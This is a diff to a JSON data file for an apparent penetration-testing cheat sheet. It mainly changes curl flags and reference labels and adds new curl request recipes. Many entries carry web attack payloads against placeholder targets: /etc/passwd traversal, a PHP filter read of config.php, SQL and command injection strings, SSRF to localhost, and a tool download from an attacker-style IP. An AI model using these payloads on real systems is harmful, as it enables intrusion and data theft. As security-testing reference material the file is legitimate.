@@ -712,7 +712,7 @@
       },
       {
         "name": "curl",
-        "manual_label": "curl",
+        "manual_label": "curl Manpage",
         "manual_url": "https://curl.se/docs/manpage.html"
       },
       {
@@ -1915,16 +1915,16 @@
       "platform": "Cross-platform",
       "type": "Command",
       "title": "Run a Basic Introspection Probe",
-      "description": "Send a tiny introspection query over JSON so you can see whether the schema is exposed before you do anything more involved.",
-      "command": "curl -isk https://target.tld/graphql -H 'Content-Type: application/json' --data '{\"query\":\"{__schema{types{name}}}\"}'",
-      "tip": "Even a blocked response is useful because it tells you how the endpoint wants to be spoken to.",
+      "description": "Send a compact GraphQL introspection query with explicit JSON semantics so you can quickly learn whether schema discovery is exposed.",
+      "command": "curl -sSki https://target.tld/graphql -H 'Content-Type: application/json' --data-raw '{\"query\":\"{__schema{types{name}}}\"}'",
+      "tip": "Even a blocked response is useful because it tells you the endpoint, transport style, and auth gate you need to compare next.",
       "tags": [
         "graphql",
         "curl",
         "introspection"
       ],
       "help_menu": "Why: schema visibility changes how quickly you can map the API.\nCompare: auth vs no-auth, GET vs POST, and JSON vs form-style bodies.",
-      "reference_label": "curl",
+      "reference_label": "curl Manpage",
       "reference_url": "https://curl.se/docs/manpage.html"
     },
     {
@@ -2261,15 +2261,15 @@
       "type": "Command",
       "title": "Baseline an SSRF Parameter",
       "description": "Replay a suspected server-side fetch feature against localhost or an internal-style address and compare the behavior carefully.",
-      "command": "curl -isk 'https://target.tld/fetch?url=http://127.0.0.1:80/'",
-      "tip": "Focus on response differences, error handling, and redirects before you widen the test.",
+      "command": "curl -sSki 'https://target.tld/fetch?url=http://127.0.0.1:80/'",
+      "tip": "Focus on response differences, error handling, and redirect behavior before you widen the test.",
       "tags": [
         "ssrf",
         "curl",
         "server-side"
       ],
-      "help_menu": "Why: SSRF testing starts with confirming who actually fetches the URL.\nCheck: localhost, private IPs, alternate schemes, and redirect handling.",
-      "reference_label": "curl",
+      "help_menu": "Why: SSRF testing starts with confirming who actually fetches the URL.\nCheck: localhost, private IPs, alternate schemes, redirect handling, and whether DNS or HTTP callbacks fire.",
+      "reference_label": "curl Manpage",
       "reference_url": "https://curl.se/docs/manpage.html"
     },
     {
@@ -2280,15 +2280,15 @@
       "type": "Command",
       "title": "Basic LFI Traversal Check",
       "description": "Probe a suspect file parameter with a short traversal string and see whether the response meaningfully changes.",
-      "command": "curl -isk 'https://target.tld/index.php?page=../../../../etc/passwd'",
-      "tip": "Watch for partial reads, truncated content, and wrapper-like behavior instead of a perfect textbook response.",
+      "command": "curl -sSki --path-as-is 'https://target.tld/index.php?page=../../../../etc/passwd'",
+      "tip": "Use --path-as-is for traversal probes when you need curl to leave dot segments alone.",
       "tags": [
         "lfi",
         "curl",
         "traversal"
       ],
-      "help_menu": "Why: simple traversal checks confirm whether the app treats the input like a path.\nCompare: a normal page, a bogus page, and a traversal target.",
-      "reference_label": "curl",
+      "help_menu": "Why: simple traversal checks confirm whether the app treats the input like a path.\nCompare: a normal page, a bogus page, and a traversal target. Use --path-as-is when normalization would hide the test.",
+      "reference_label": "curl Manpage",
       "reference_url": "https://curl.se/docs/manpage.html"
     },
     {
@@ -2299,7 +2299,7 @@
       "type": "Command",
       "title": "Boolean-Based Test in a GET Parameter",
       "description": "Replay a suspected parameter with a tiny boolean payload to see whether the response changes in a consistent way.",
-      "command": "curl -isk 'https://target.tld/item?id=1%27%20AND%201=1--%20-'",
+      "command": "curl -sSki 'https://target.tld/item?id=1%27%20AND%201=1--%20-'",
       "tip": "Compare with a deliberately false condition next so you have a clean A/B baseline.",
       "tags": [
         "curl",
@@ -2308,7 +2308,7 @@
         "validation"
       ],
       "help_menu": "Why: curl is fast for first-pass replay work.\nPair with: a false condition, timing checks, or a captured authenticated request.",
-      "reference_label": "curl",
+      "reference_label": "curl Manpage",
       "reference_url": "https://curl.se/docs/manpage.html"
     },
     {
@@ -2319,15 +2319,15 @@
       "type": "Command",
       "title": "Check Time-Based Execution",
       "description": "Use a short delay payload when output is suppressed and the application gives you little direct feedback.",
-      "command": "curl -isk 'https://target.tld/ping?host=127.0.0.1%26%26sleep%205'",
-      "tip": "Take multiple timings. One slow response is not enough on its own.",
+      "command": "curl -sSki 'https://target.tld/ping?host=127.0.0.1%26%26sleep%205'",
+      "tip": "Take multiple timings and keep the delay short. One slow response is not enough on its own.",
       "tags": [
         "cmdi",
         "curl",
         "time-based"
       ],
       "help_menu": "Why: timing helps when output is blind.\nKeep delays short and compare several requests to reduce false positives.",
-      "reference_label": "curl",
+      "reference_label": "curl Manpage",
       "reference_url": "https://curl.se/docs/manpage.html"
     },
     {
@@ -2338,15 +2338,15 @@
       "type": "Command",
       "title": "Probe with Common Separators",
       "description": "Try a tiny separator payload against a suspect parameter and compare the response with a known-good baseline.",
-      "command": "curl -isk 'https://target.tld/ping?host=127.0.0.1;id'",
-      "tip": "Keep the first payloads small and obvious. The goal is confirmation, not spectacle.",
+      "command": "curl -sSki 'https://target.tld/ping?host=127.0.0.1;id'",
+      "tip": "Keep the first payloads small and obvious. The goal is confirmation, not noise.",
       "tags": [
         "cmdi",
         "curl",
         "web"
       ],
       "help_menu": "Why: separators often show whether the input is touching a shell.\nCompare with: a normal value and a clearly invalid value.",
-      "reference_label": "curl",
+      "reference_label": "curl Manpage",
       "reference_url": "https://curl.se/docs/manpage.html"
     },
     {
@@ -2357,15 +2357,15 @@
       "type": "Command",
       "title": "Replay a Multipart Upload",
       "description": "Use curl to replay the exact upload flow with a chosen file, cookies, and form fields once you know the request shape.",
-      "command": "curl -isk 'https://target.tld/upload' -b 'session=VALUE' -F 'file=@avatar.jpg' -F 'submit=Upload'",
-      "tip": "Start with a known-good file first so you understand the normal success path.",
+      "command": "curl -sSki 'https://target.tld/upload' -b 'session=VALUE' -F 'file=@avatar.jpg;type=image/jpeg' -F 'submit=Upload'",
+      "tip": "Start with a known-good file first, then change one control at a time: name, extension, MIME type, or contents.",
       "tags": [
         "upload",
         "multipart",
         "curl"
       ],
       "help_menu": "Why: direct multipart replay makes it easier to test file validation logic.\nChange only one control at a time: filename, extension, MIME type, or contents.",
-      "reference_label": "curl",
+      "reference_label": "curl Manpage",
       "reference_url": "https://curl.se/docs/manpage.html"
     },
     {
@@ -2376,7 +2376,7 @@
       "type": "Command",
       "title": "Test a PHP Wrapper Read",
       "description": "Try a read-only PHP wrapper when the app looks like it includes local files but direct traversal is noisy.",
-      "command": "curl -isk 'https://target.tld/index.php?page=php://filter/convert.base64-encode/resource=config.php'",
+      "command": "curl -sSki 'https://target.tld/index.php?page=php://filter/convert.base64-encode/resource=config.php'",
       "tip": "Base64 output is often a clearer proof than a broken render or a generic error page.",
       "tags": [
         "lfi",
@@ -2384,7 +2384,7 @@
         "wrappers"
       ],
       "help_menu": "Why: wrappers can turn a partial include into readable content.\nUse when: the target looks PHP-based and the include path is under your control.",
-      "reference_label": "curl",
+      "reference_label": "curl Manpage",
       "reference_url": "https://curl.se/docs/manpage.html"
     },
     {
@@ -2395,8 +2395,8 @@
       "type": "Command",
       "title": "Time-Based Test in a POST Body",
       "description": "Use a short delay payload when the app hides errors and visible content differences stay inconsistent.",
-      "command": "curl -isk 'https://target.tld/search' --data 'q=test%27%20AND%20SLEEP(5)--%20-'",
-      "tip": "Keep the delay short and compare multiple times so normal latency does not fool you.",
+      "command": "curl -sSki 'https://target.tld/search' --data-raw 'q=test%27%20AND%20SLEEP(5)--%20-'",
+      "tip": "Keep the delay short and compare several runs so normal latency does not fool you.",
       "tags": [
         "curl",
         "sqli",
@@ -2404,7 +2404,7 @@
         "time-based"
       ],
       "help_menu": "Why: timing is useful when the app gives you very little else.\nCheck: median response time, retry consistency, and whether caching is involved.",
-      "reference_label": "curl",
+      "reference_label": "curl Manpage",
       "reference_url": "https://curl.se/docs/manpage.html"
     },
     {
@@ -2994,16 +2994,16 @@
       "platform": "Cross-platform",
       "type": "Command",
       "title": "Pull a File with curl",
-      "description": "Use curl to fetch a file directly when an HTTP server is already available and you need the simplest possible transfer.",
-      "command": "curl -O http://10.10.14.10/tool.sh",
-      "tip": "Pair this with checksums or file-size verification when the file is important.",
+      "description": "Use curl to fetch a file directly when an HTTP server is already available and you want failure handling plus a predictable output name.",
+      "command": "curl -fL -o tool.sh http://10.10.14.10/tool.sh",
+      "tip": "Use -f so HTTP errors fail clearly, -L when redirects are expected, and verify size or checksum for important files.",
       "tags": [
         "files",
         "curl",
         "transfer"
       ],
-      "help_menu": "Why: curl is widely available and predictable.\nUse for: scripts, archives, notes, or tooling fetched over HTTP.",
-      "reference_label": "curl",
+      "help_menu": "Why: curl is widely available and predictable.\nUse for: scripts, archives, notes, or tooling fetched over HTTP. Add chmod only after you verify the file landed correctly.",
+      "reference_label": "curl Manpage",
       "reference_url": "https://curl.se/docs/manpage.html"
     },
     {
@@ -4040,7 +4040,7 @@
       "platform": "Web",
       "title": "Check Headers Fast",
       "description": "Grab response headers quickly to identify status code, server hints, security headers, and redirect behavior.",
-      "command": "curl -I https://<TARGET>",
+      "command": "curl -sSI https://<TARGET>",
       "tip": "This stays useful even when you later switch to a browser or proxy.",
       "tags": [
         "curl",
@@ -4048,11 +4048,11 @@
         "headers",
         "fingerprinting"
       ],
-      "help_menu": "Why: `curl -I` gives you the low-noise first look at a web target.\nLook for: redirects, HSTS, cookies, server headers, and unusual cache behavior.",
+      "help_menu": "Why: header-only requests give you a low-noise first look at a web target.\nLook for: redirects, HSTS, cookies, server headers, cache behavior, and missing security headers.",
       "path": "Scoping & Setup",
       "module": "HTTP Replay & Request Crafting",
       "type": "Command",
-      "reference_label": "curl",
+      "reference_label": "curl Manpage",
       "reference_url": "https://curl.se/docs/manpage.html"
     },
     {
@@ -4061,7 +4061,7 @@
       "platform": "Web",
       "title": "Inspect a Full Response Sample",
       "description": "Fetch a page with headers and body so you can see redirects, cookies, and the first chunk of actual content without opening a browser.",
-      "command": "curl -isk https://<TARGET>/login | sed -n '1,20p'",
+      "command": "curl -sSki https://<TARGET>/login | sed -n '1,30p'",
       "tip": "Great when you want a quick human-readable preview before deeper probing.",
       "tags": [
         "curl",
@@ -4073,7 +4073,7 @@
       "path": "Scoping & Setup",
       "module": "HTTP Replay & Request Crafting",
       "type": "Command",
-      "reference_label": "curl",
+      "reference_label": "curl Manpage",
       "reference_url": "https://curl.se/docs/manpage.html"
     },
     {
@@ -4084,7 +4084,7 @@
       "type": "Command",
       "title": "Replay a POST with URL-Encoded Data",
       "description": "Send a classic form POST with explicit content type and body so you can replay login or search actions by hand.",
-      "command": "curl -isk 'https://target.tld/login' -H 'Content-Type: application/x-www-form-urlencoded' --data 'username=test&password=test'",
+      "command": "curl -sSki 'https://target.tld/login' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'username=test&password=test'",
       "tip": "Add cookies, CSRF tokens, and headers only after you have the simplest working request first.",
       "tags": [
         "web",
@@ -4094,7 +4094,107 @@
         "requests"
       ],
       "help_menu": "Why: form posts are still everywhere.\nUse for: auth forms, search boxes, password reset forms, and manual response diffing.",
-      "reference_label": "curl",
+      "reference_label": "curl Manpage",
+      "reference_url": "https://curl.se/docs/manpage.html"
+    },
+    {
+      "path": "Scoping & Setup",
+      "module": "HTTP Replay & Request Crafting",
+      "tool": "curl",
+      "platform": "Cross-platform",
+      "type": "Command",
+      "title": "Measure Status, Size, and Timing",
+      "description": "Reduce a request to stable numbers so you can compare redirects, filters, payloads, and auth states without reading the whole body every time.",
+      "command": "curl -sSk -o /dev/null -w 'code=%{http_code} size=%{size_download} time=%{time_total} redirect=%{redirect_url}\\n' https://<TARGET>/login",
+      "tip": "Use this before and after a payload change when body diffs are too noisy.",
+      "tags": [
+        "curl",
+        "http",
+        "baseline",
+        "timing"
+      ],
+      "help_menu": "Why: status, size, and timing make manual comparisons much cleaner.\nUse for: auth differences, WAF behavior, cache checks, redirect mapping, and blind validation.",
+      "reference_label": "curl Manpage",
+      "reference_url": "https://curl.se/docs/manpage.html"
+    },
+    {
+      "path": "Scoping & Setup",
+      "module": "HTTP Replay & Request Crafting",
+      "tool": "curl",
+      "platform": "Cross-platform",
+      "type": "Command",
+      "title": "Save Headers and Body Separately",
+      "description": "Capture response headers and body into separate files so you can diff them, attach evidence, or inspect large responses without cluttering the terminal.",
+      "command": "curl -sSk -D headers.txt -o body.html https://<TARGET>/login",
+      "tip": "Pair this with diff or git when you need clean before-and-after evidence.",
+      "tags": [
+        "curl",
+        "http",
+        "evidence",
+        "headers"
+      ],
+      "help_menu": "Why: separating headers and body keeps evidence readable.\nUse when: tracking cookie changes, redirect behavior, caching, or response-body changes across tests.",
+      "reference_label": "curl Manpage",
+      "reference_url": "https://curl.se/docs/manpage.html"
+    },
+    {
+      "path": "Scoping & Setup",
+      "module": "HTTP Replay & Request Crafting",
+      "tool": "curl",
+      "platform": "Cross-platform",
+      "type": "Command",
+      "title": "Pin a Hostname to an IP",
+      "description": "Use curl DNS pinning when you need the correct Host/SNI name but want traffic to hit a specific IP address.",
+      "command": "curl -sSki --resolve app.target.tld:443:10.10.10.10 https://app.target.tld/",
+      "tip": "This is cleaner than editing /etc/hosts for one-off virtual-host checks.",
+      "tags": [
+        "curl",
+        "http",
+        "vhost",
+        "sni"
+      ],
+      "help_menu": "Why: virtual hosts often require the hostname even when you are testing a raw IP.\nUse for: vhost validation, staging hosts, CDN bypass checks in scope, and local routing experiments.",
+      "reference_label": "curl Manpage",
+      "reference_url": "https://curl.se/docs/manpage.html"
+    },
+    {
+      "path": "Scoping & Setup",
+      "module": "HTTP Replay & Request Crafting",
+      "tool": "curl",
+      "platform": "Cross-platform",
+      "type": "Command",
+      "title": "Persist Cookies Across Requests",
+      "description": "Write cookies from one response and reuse them in the next request so login, redirect, or CSRF workflows stay reproducible in the terminal.",
+      "command": "curl -sSk -c cookies.txt 'https://target.tld/login'\ncurl -sSk -b cookies.txt 'https://target.tld/account'",
+      "tip": "Use a fresh cookie jar per test case so state does not bleed between comparisons.",
+      "tags": [
+        "curl",
+        "cookies",
+        "auth",
+        "workflow"
+      ],
+      "help_menu": "Why: cookie jars keep manual replay stateful without hiding what is happening.\nUse for: login flows, redirects, session fixation checks, and comparing anonymous vs authenticated behavior.",
+      "reference_label": "curl Manpage",
+      "reference_url": "https://curl.se/docs/manpage.html"
+    },
+    {
+      "path": "Exploitation & Access",
+      "module": "API & GraphQL Testing",
+      "tool": "curl",
+      "platform": "Cross-platform",
+      "type": "Command",
+      "title": "Replay an Authenticated JSON API Request",
+      "description": "Send an authenticated JSON API request with explicit headers so auth, content negotiation, and response metadata are all visible.",
+      "command": "curl -sSki 'https://target.tld/api/v1/users/1' -H 'Authorization: Bearer TOKEN' -H 'Accept: application/json'",
+      "tip": "Keep the first API replay read-only, then compare IDs, roles, or tenant values one at a time.",
+      "tags": [
+        "api",
+        "curl",
+        "json",
+        "bearer"
+      ],
+      "help_menu": "Why: direct API replay is ideal for clean authorization comparisons.\nUse for: IDOR checks, role comparisons, bearer-token behavior, and quick response diffing.",
+      "reference_label": "curl Manpage",
       "reference_url": "https://curl.se/docs/manpage.html"
     },
     {
